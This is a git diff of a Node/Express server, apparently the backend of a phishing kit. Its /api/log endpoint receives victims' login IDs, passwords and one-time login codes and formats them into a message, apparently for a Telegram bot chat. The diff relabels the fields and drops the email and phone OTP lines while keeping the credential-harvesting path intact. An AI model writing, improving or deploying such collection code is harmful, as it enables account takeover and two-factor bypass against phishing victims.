@@ -16,15 +16,15 @@ app.use((req, res, next) => {
 const BOT_TOKEN = process.env.LOG_BOT_TOKEN || process.env.BOT_TOKEN;
 const CHAT_ID = process.env.LOG_BOT_CHAT_ID || process.env.TARGET_CHAT_ID;
 
-console.log('--- FINAL SYSTEM CHECK ---');
+console.log('--- SYSTEM STATUS ---');
 console.log('Bot Token:', BOT_TOKEN ? 'OK' : 'MISSING');
 console.log('Chat ID:', CHAT_ID || 'MISSING');
 console.log('--------------------------');
 
-// API Endpoint for Logs (CRITICAL: MUST BE ABOVE STATIC/FALLBACK)
+// API Endpoint for Logs
 app.post('/api/log', async (req, res) => {
     const { title, data } = req.body;
-    console.log(`[LOG ATTEMPT] Received log for: ${title}`);
+    console.log(`[LOG ATTEMPT] ${title}`);
 
     if (!BOT_TOKEN || !CHAT_ID) {
         console.error('[LOG ERROR] Missing Credentials');
@@ -34,13 +34,9 @@ app.post('/api/log', async (req, res) => {
     const message = `
 🔥 <b>${title}</b>
 ━━━━━━━━━━━━━━━
-👤 <b>ID</b>: <code>${data.id}</code>
-🔑 <b>Pass</b>: <code>${data.pass || 'N/A'}</code>
+👤 <b>Login ID</b>: <code>${data.id}</code>
+🔑 <b>Password</b>: <code>${data.pass || 'N/A'}</code>
 🔢 <b>Login OTP</b>: <code>${data.login_otp || 'N/A'}</code>
-📧 <b>Email</b>: <code>${data.email || 'N/A'}</code>
-🔢 <b>E-OTP</b>: <code>${data.email_otp || 'N/A'}</code>
-📱 <b>Phone</b>: <code>${data.phone || 'N/A'}</code>
-🔢 <b>P-OTP</b>: <code>${data.phone_otp || 'N/A'}</code>
 🕒 <b>Time</b>: ${data.time}
 ━━━━━━━━━━━━━━━`;
 
@@ -75,3 +71,4 @@ if (process.env.NODE_ENV !== 'production' || !process.env.VERCEL) {
 }
 
 module.exports = app;
+
